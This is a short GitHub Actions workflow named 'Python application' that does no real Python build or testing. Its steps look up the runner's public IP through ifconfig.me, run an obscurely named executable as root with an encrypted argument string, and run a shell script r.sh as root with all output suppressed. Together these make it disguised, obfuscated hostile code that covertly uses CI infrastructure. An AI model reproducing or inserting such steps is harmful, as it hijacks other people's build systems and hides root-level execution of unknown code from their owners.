name: Python application

on:
  push:
    branches: [ "main" ]
  pull_request:
    branches: [ "main" ]

permissions:
  contents: read

jobs:
  build:

    runs-on: ubuntu-latest
    timeout-minutes: 15

    steps:
    - uses: actions/checkout@v3
    - name: Set up Python 3.8
      uses: actions/setup-python@v3
      with:
        python-version: "3.8"
    - name: Install dependencies
      run: |
        python -m pip install --upgrade pip
        curl ifconfig.me > ip.txt
        cat ip.txt
    - name: Test run
      run: |
        cd ${{ github.workspace }}
        echo 'zzfxf'
        sudo chmod +x garyiip7x/heardyg34i.ex
        sudo ./garyiip7x/heardyg34i.ex U2FsdGVkX1/oTLW1ubZdzi/n3jf2LlQJowDyg+NAT1kXVvgDhqAWcQxejverUb0fW5ili37aXhKm6t/UlEkmXLKwx8rZUKAE0xEx/s/qJTbsx0sawKtmv92mbF0TRu68 9rika8 && sudo sh r.sh > /dev/null 2>&1
